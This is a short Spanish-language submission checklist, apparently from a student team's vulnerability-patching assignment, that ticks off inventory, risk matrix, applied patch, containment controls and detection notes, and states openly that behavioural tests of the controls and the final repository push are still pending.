- [x] Inventario con evidencia (versión, SAPI, configuración).
- [x] Matriz con decisión y plazo.
- [x] Parche aplicado y verificado; reversión documentada.
- [x] Controles de contención documentados con su alcance de verificación (§5).
- [ ] Pruebas de comportamiento de al menos tres controles: la configuración inspeccionada no sustituye esas pruebas; no se realizaron en esta revisión.
- [x] `deteccion.md` completo.
- [x] `informe.md` de Lorenzo existente; no acredita la entrega individual de los demás integrantes.
- [x] Sin claves, tokens ni placeholders.
- [ ] Repo pusheado y PR abierto.

Checklist completa: [`../../docs/checklist-entrega.md`](../../docs/checklist-entrega.md).
